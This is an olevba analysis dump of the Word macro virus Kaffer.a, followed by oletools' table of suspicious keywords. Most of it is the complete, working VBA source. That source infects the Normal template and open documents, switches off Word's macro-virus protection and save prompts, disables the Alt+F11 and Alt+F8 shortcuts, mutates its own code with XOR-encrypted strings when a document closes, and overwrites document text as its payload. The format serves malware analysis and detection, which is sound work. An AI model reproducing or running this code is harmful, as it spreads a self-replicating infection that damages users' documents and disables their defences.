olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Kaffer.a-37e82aa65d9d38f70d7b1dbbd2ac56a33cdb3ba8
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Kaffer.a-37e82aa65d9d38f70d7b1dbbd2ac56a33cdb3ba8 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisDocument1.cls 
in file: Virus.MSWord.Kaffer.a-37e82aa65d9d38f70d7b1dbbd2ac56a33cdb3ba8 - OLE stream: 'Macros/VBA/ThisDocument1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Kaffer()
  Set normal1 = NormalTemplate.VBProject.VBComponents(((0 Xor 0 Xor 0) Xor 1)).CodeModule
                              With ThisDocument: With .VBProject: With .VBComponents(((0 Xor 0 Xor 0) Xor 1)): Set this1 = .CodeModule: End With: End With: End With
                                    mycode = this1.lines(((Fix(1 Xor 1)) Xor 1), 600)
               With NormalTemplate.VBProject.VBComponents.Item(((Fix(1 Xor 1)) Xor 1)).CodeModule
                       .deletelines ((Int(1 Xor 1)) Xor 1), .countoflines
                                 .insertlines ((1 Xor 1) Xor 1), mycode
                         End With
                                    Set act1 = ActiveDocument.VBProject.VBComponents(((Fix(1 Xor 1)) Xor 1)).CodeModule
   With ActiveDocument.VBProject.VBComponents.Item(((0 Xor 0 Xor 0) Xor 1)).CodeModule
                                   If LCase(.lines(((Int(0.99999)) Xor 1), ((Fix(1 Xor 1)) Xor 1))) <> "private sub wm97_kaffer()" Then
                   .deletelines ((Int(0.99999)) Xor 1), .countoflines
                           .insertlines ((Fix(1 Xor 1)) Xor 1), mycode
               End If
                End With

                        With Application.Application.Application.Application.Application.Options
                           .Application.Options.Application.Options.VirusProtection = (1 Xor 1)
                                    .Application.Options.Application.Options.ConfirmConversions = (1 Xor 1)
                      .Application.Options.Application.Options.Application.Options.SaveNormalPrompt = (Fix(1 Xor 1))
                End With
     With Application.Application
    .ScreenUpdating = (Fix(1 Xor 1))
                               .ShowVisualBasicEditor = (Int(0.99999))
                              .DisplayAlerts = wdAlertsNone
  .KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
       .EnableCancelKey = wdCancelDisabled
                    .KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF8), KeyCategory:=0, Command:=" "
                End With
End Sub
Private Sub Document_Close()
Randomize Timer
slt1 = rndm(((0 Xor 0 Xor 0) Xor 5))
Call Mutate
Call Kaffer
NormalTemplate.VBProject.VBComponents(1).CodeModule.deletelines 2, 29
ActiveDocument.VBProject.VBComponents(1).CodeModule.deletelines 2, 29
With NormalTemplate: SetAttr .FullName, vbNormal: .Save: End With
With ActiveDocument: SetAttr .FullName, vbNormal: .SaveAs .FullName: End With
With ActiveDocument.Content
If UCase(InStr(((0 Xor 0 Xor 0) Xor 1), .Text, "KAFFER")) Then Call Payload
End With
End Sub
Private Function rndm(a)
Randomize Timer
rndm = Int(Rnd * a) + ((0 Xor 0 Xor 0) Xor 1)
End Function
Private Function spa()
spa = Space(rndm(((0 Xor 0 Xor 0) Xor 40)))
End Function
Private Function num(aa)
Select Case aa
Case 0
Select Case rndm(6)
Case 1: num = Crypt("­µĄýę÷ĄµĄýę÷Ąµ¬", 133)
Case 2: num = Crypt("ŞäëúŞ˛¬»»»»»««", 130)
Case 3: num = Crypt("¬íęđ¬´Ş˝˝˝˝˝­­", 132)
Case 4: num = Crypt("ďöçż¨µçöî", 199)
Case 5: num = Crypt("^YCOXE

", 55)
Case 6: num = Crypt("ýłĽ­ýäő­ş§őäüü", 213)
End Select
Case 1
Select Case rndm(6)
Case 1: num = Crypt("şş˘˛ęýŕ˛˘˛ęýŕ˛˘»˛ęýŕ˛Ł»", 146)
Case 2: num = Crypt("ěě˘­ĽěôęýýýýýýííäĽ«¶äőí", 196)
Case 3: num = Crypt("đđ±¶¬đčöáááááńńř ·Şřéń", 216)
Case 4: num = Crypt("ŹŹ–‡ßČŐ‡–Ž‡ßČŐ‡–Ž", 167)
Case 5: num = Crypt("§§ćáű§ľŻ÷ŕýŻľ¦¦ŻŻ÷ŕýŻľ¦", 143)
Case 6: num = Crypt("óó˝˛ŁóęűŁ´©űęňňűŁ´©űęň", 219)
End Select
End Select
End Function
Private Sub Mutate()
Select Case rndm(3)
Case 1: b = spa & Crypt("$WFWJW9#Y!5'
Y!54_", 119) & num(1) & Crypt("(/bnedlnetmd", 1)
Case 2: b = spa & Crypt("dZG[}\A^R_gV^C_RGV
eqcA\YVPG
eqp\^C\]V]G@", 51) & num(1) & Crypt("śŹ•ćĐÁ•ŰÚÇŘÔŮ„•�•›ÖÚŃĐŘÚŃŔŮĐŹ•đŰŃ•âÜÁÝ", 181)
Case 3: b = spa & Crypt("Ůçúć®ŔáüăďâÚëăţâďúë´®Ůçúć® ŘĚŢüáäëíú´®Ůçúć® ŘĚÍáăţáŕëŕúý¦", 142) & num(1) & Crypt("°ŁąĘüíą÷öëôřő¨ą¤ą·úöýüôöýěőüŁąÜ÷ýąÎđíńŁąÜ÷ýąÎđíńŁąÜ÷ýąÎđíń", 153)
End Select
Select Case rndm(3)
Case 1: c = spa & Crypt("Ýëú®úćçýż®ł®Úćçýęáíűăëŕú ŘĚŢüáäëíú ŘĚÍáăţáŕëŕúý¦", 142) & num(1) & Crypt("˘Ąčäďîćäďţçî", 139)
Case 2: c = spa & Crypt("ĺŰĆÚ’ćÚŰÁÖÝŃÇß×ÜĆśäđâŔÝŘ×ŃĆśäđńÝßÂÝÜ×ÜĆÁš", 178) & num(1) & Crypt("|ou0!u!=<&duhu{6:108:1 90ou;1u<!=", 85)
Case 3: c = spa & Crypt("Ćřĺů±ĺůřâőţňäüô˙ĺ«±Ćřĺů±żÇÓÁăţűôňĺ«±Ćřĺů±żÇÓŇţüáţ˙ô˙ĺâą", 145) & num(1) & Crypt("ŻĽ¦Őăň¦ňîďő·¦»¦¨ĺéâăëéâóęăĽ¦Ăčâ¦ŃďňîĽ¦Ăčâ¦ŃďňîĽ¦Ăčâ¦Ńďňî", 134)
End Select
Select Case rndm(3)
Case 1: d = spa & Crypt("$>298}`})54.ls1438.u", 93) & num(1) & Crypt("±«­­´", 157)
Case 2: d = spa & Crypt("ËőčôĽČôőďřó˙éńůňč˛ĘŢĚîóöů˙č˛ĘŢßóńěóňůňčď´", 156) & num(1) & Crypt("řëńś¨˛ľµ´ńěń˙˛ľµ´Ľľµ¤˝´˙˝¸ż´˘ů", 209) & num(1) & Crypt("âřţţçîôî‹ Şî™§ş¦", 206)
Case 3: d = spa & Crypt("ëŐČÔśČÔŐĎŘÓßÉŃŮŇČ†śëŐČÔś’ęţěÎÓÖŮßČ†śëŐČÔś’ęţ˙ÓŃĚÓŇŮŇČĎ”", 188) & num(1) & Crypt("¸«±Üčňţőô±¬±żŇţőôüţőäýôżýř˙ôâą", 145) & num(1) & Crypt("®´˛˛«˘¸Çěć˘Őëöę¸˘Çěć˘Őëöę¸˘Çěć˘Őëöę", 130)
End Select
Select Case rndm(3)
Case 1: e = spa & Crypt("đÎÓĎ‡ÉČŐĘĆË–", 167)
Case 2: e = spa & Crypt("Üâ˙ă«ĺäůćęç˙îćűçę˙îĄýéűůäáîč˙Ąýéčäćűäĺîĺ˙řĄâ˙îćŁ", 139) & num(1) & Crypt("¤Łîâéčŕâéřáč", 141)
Case 3: e = spa & Crypt("řćűçŻáŕýâîăűęâ˙ăîűęˇůí˙ýŕĺęěűˇůíěŕâ˙ŕáęáűü§", 143) & num(1) & Crypt("™žÓßÔŐÝßÔĹÜŐ", 176)
End Select
Select Case rndm(3)
Case 1: f = spa & Crypt("v<=4=,=416=+x", 88) & num(1) & Crypt("\P^


", 112)
Case 2: f = spa & Crypt("ELQjj
", 35) & num(1) & Crypt("ŤŮÂŤ�ÎÂŘĂŮÂËÁÄĂČŢ—Ť�ßČÝÁĚÎČÁÄĂČŤää�", 173) & Chr(34) & Chr(34) & Crypt("öě˘©´¸", 204)
Case 3: f = spa & Crypt("54)6:7ju?>7>/>725>({", 91) & num(1) & Crypt("]\A^R_
P\F]G\U_Z]V@", 51)
End Select
Select Case rndm(3)
Case 1: g = spa & Crypt("é¦ŁŁˇµ¨Ş´łµ®© çŞľ¤¨Ł˘", 199)
Case 2: g = spa & Crypt("4stihnvsti:", 26) & num(1) & Crypt("�ŤŔÔÎÂÉČ", 173)
Case 3: g = spa & Crypt("ëę÷čäé´«äááă÷ęčöń÷ěëâĄČüćęáŕ", 133)
End Select
h = spa & Crypt(".$`7)4(", 64)
Select Case rndm(3)
Case 1: i = spa & Crypt("ßéř¬íďř˝¬±¬íďřĺúéčăďůáéâř˘ÚÎÜţăćéďř˘ÚÎĎăáüăâéâř˙¤", 140) & num(1) & Crypt("�źŇŢŐÔÜŢŐÄÝÔ", 177)
Case 2: i = spa & Crypt("Öčőéˇŕâőč÷äĺîâôěäďőŻ×ĂŃóîëäâőŻ×ĂÂîěńîďäďőň©", 129) & num(1) & Crypt("Ą¶¬ßéř¬íďř˝¬±¬˘ďăčéáăčůŕé¶¬Éâč¬Űĺřä", 140)
Case 3: i = spa & Crypt("×éôč áăôéöĺäďăőíĺîôş ×éôč ®ÖÂĐňďęĺăôş ×éôč ®ÖÂĂďíđďîĺîôó¨", 128) & num(1) & Crypt("ĺöěź©¸ě­Ż¸ýěńěâŻŁ¨©ˇŁ¨ą ©öě‰˘¨ě›Ą¸¤öě‰˘¨ě›Ą¸¤öě‰˘¨ě›Ą¸¤", 204)
End Select
Select Case rndm(3)
Case 1: j = spa & Crypt("RC", 114)
Case 2: j = spa & Crypt("iwjv>}jwh{zq}ks{pj0h|nlqt{}j0h|}qsnqp{pjm6", 30) & num(1) & Crypt(">9txsrzxsb{r", 23)
Case 3: j = spa & Crypt("E[FZSQF[DWV]QG_W\F
DPB@]XWQF
DPQ]_B]\W\FA
[FW_", 50) & num(1) & Crypt("äă®˘©¨ ˘©¸ˇ¨", 205)
End Select
Select Case rndm(2)
Case 1: k = spa & Crypt("×ŘžňÝßÍŰ–�Ň×ĐŰÍ–––×ĐĘ–Ž�‡‡‡‡‡——žĆŃĚžŹ—’––Ř×Ć–ŹžĆŃĚžŹ——žĆŃĚžŹ———ž‚€ž", 190) & Chr(34) & Crypt("sqjubwf#pva#tn:4\hbeefq+*", 3) & Chr(34) & Crypt("
IUXS", 61)
Case 2: k = spa & Crypt("‚ŤËž�Š�ŽĂĹ‡‚…Ž�ĂĂĂ‚…źĂŰĹŇŇŇŇŇÂÂË“„™ËÚÂÇĂĂŤ‚“ĂÚË“„™ËÚÂÂË“„™ËÚÂÂÂË×ŐË", 235) & Chr(34) & Crypt("¤¦˝˘µ ±Ô§ˇ¶ÔŁąÍĂ«żµ˛˛±¦ÜÝ", 244) & Chr(34) & Crypt("q%94?", 81)
End Select
Select Case rndm(2)
Case 1: l = spa & Crypt("›ŃĐŮĐÁĐŮÜŰĐĆ•", 181) & num(1) & Crypt("˙óý°Ľ¦˝§Ľµżş˝¶ ", 211)
Case 2: l = spa & Crypt("
C**C^C", 99) & num(1) & Crypt("°ä˙°ľó˙ĺţä˙öüůţőăŞ", 144) & spa & Crypt("žÂŐŔÜŃÓŐÜŮŢŐ�ůůś", 176) & Chr(34) & Chr(34) & Crypt("�ŐŢĂĎ", 187)
End Select
Select Case rndm(2)
Case 1: m = spa & Crypt("ěŁ¦¦¤°­Ż±¶°«¬ĄâŻ»ˇ­¦§", 194)
Case 2: m = spa & Crypt("
KLQGPVNKLGQ", 34) & num(1) & Crypt("s2&<0;:", 95)
End Select
n = spa & Crypt("MFL\x08AN", 40)
o = spa & Crypt("¨Ł©íş¤ąĄ", 205)
p = spa: For oooo = 1 To rndm(6): tp = tp & Crypt(".??#&,.;& !a", 79): Next: p = p & Crypt("$:';s", 83) & tp & Crypt("¨·ł®¨©´", 199): tp = ""
q = spa: For oooo = 1 To rndm(6): q = q & Crypt("v9((41;9,176v7(,176+", 88): Next: q = q & Crypt("ŚÔËĐ×ŃŇĐÍÖÇÁÖËÍĚ‚ź‚", 162) & num(0): tp = ""
r = spa: For oooo = 1 To rndm(6): r = r & Crypt("ý˛ŁŁżş°˛§şĽ˝ýĽŁ§şĽ˝ ", 211): Next: r = r & Crypt("żňţ˙÷řăüňţ˙çôăâřţ˙â±¬±", 145) & num(0): tp = ""
s = spa: For oooo = 1 To rndm(6): s = s & Crypt("ěŁ˛˛®«ˇŁ¶«­¬ě­˛¶«­¬±", 194): Next: s = s & Crypt("s.<+832/0<1-/20-)}`}", 93) & num(0): tp = ""
u = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ÖÇÇŰŢÔÖĂŢŘŮ™", 183): Next: u = u & Crypt("öčőéˇ", 129) & tp & Crypt("Ăňňîëáăöëíě", 130): tp = ""
v = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ăŚ˝˝ˇ¤®¬ą¤˘Ł", 205): Next: v = v & Crypt("O_NYYRILX]HUR[

", 60) & num(0): tp = ""
w = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("N__CFLN[F@A", 47): Next: w = w & Crypt("©ÔďčđŃîôňćëĹćôîäÂăîóčő§ş§", 135) & num(0): tp = ""
x = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("®Áđđěéăáôéďî", 128): Next: x = x & Crypt(" Ęçýţâď÷Ďâëüúý®ł®ůęĎâëüúýŔáŕë", 142): tp = ""
y = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ţ±  Ľął±¤ążľ", 208): Next: y = y & Crypt("¨Íă˙Äďčâďčáő¨Çââ¦Íă˙ĹéâăĽ»ÄóďęâÍă˙Ĺéâă®ńâÍă˙ÇęňŞ¦ńâÍă˙Ŕ··ŻŞ¦Íă˙Ĺçňăáéô˙Ľ»¶Ş¦ĹéëëçčâĽ»", 134) & Chr(34) & Chr(32) & Chr(34): tp = ""
z = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("©ć÷÷ëîäćóîčé", 135): Next: z = z & Crypt("Q:

<

4_B_\x08<

;


", 127): tp = ""
more = spa: For oooo = 1 To rndm(6): tp = tp & Crypt("ţ±  Ľął±¤ążľ", 208): Next: more = more & Crypt("ń”ş¦ť¶±»¶±¸¬ńž»»˙”ş¦ś°»şĺâťŞ¶ł»”ş¦ś°»ş÷¨»”ş¦žł«ó˙¨»”ş¦™çöó˙”ş¦śľ«ş¸°­¦ĺâďó˙ś°˛˛ľ±»ĺâ˙", 223) & Chr(34) & Chr(32) & Chr(34): tp = ""

With ThisDocument.VBProject.VBComponents(1).CodeModule
.replaceline 2, b: .replaceline 3, c: .replaceline 4, d: .replaceline 5, e
.replaceline 6, f: .replaceline 7, g: .replaceline 8, h: .replaceline 9, i
.replaceline 10, j: .replaceline 11, k: .replaceline 12, l: .replaceline 13, m
.replaceline 14, n: .replaceline 15, o: .replaceline 17, p: .replaceline 18, q:
.replaceline 19, r: .replaceline 20, s: .replaceline 21, o: .replaceline 22, u:
.replaceline 23, v: .replaceline 24, w: .replaceline 25, x: .replaceline 26, y:
.replaceline 27, z: .replaceline 28, more: .replaceline 29, o
End With

End Sub
Private Sub Payload()
With ActiveDocument.Content
With .Font
.Name = (rndm(10))
.Size = (20 + rndm(10))
.ColorIndex = (rndm(19) - 1)
.Animation = (rndm(6) - 1)
End With
.Text = Crypt("ĚĄÍäńŕĄÎäăăŕ÷öĄ¨ĄŃíŕüĄéěîŕĄńęĄ÷đéŕĄđöĄŇíěńŕö©ĄçđńĄńíŕüĄä÷ŕĄăđćîŕáĄňěńíĄÄĚÁÖĄ¤", 133)
End With
End Sub
Private Function Crypt(klo, key)
Crypt = ""
For i = 1 To Len(klo)
Crypt = Crypt & Chr(Asc(Mid(klo, i, 1)) Xor key)
Next
End Function
Private Sub jio()
Randomize Timer
key = 133
aaa = InputBox("", "")
mmm = InputBox("", "", "crypt(" & Chr(34) & Crypt(aaa, key) & Chr(34) & "," & key & ")")
End Sub


























































































































































































































































































































































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|'\x08'              |May use special characters such as backspace |
|          |                    |to obfuscate code when printed on the console|
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
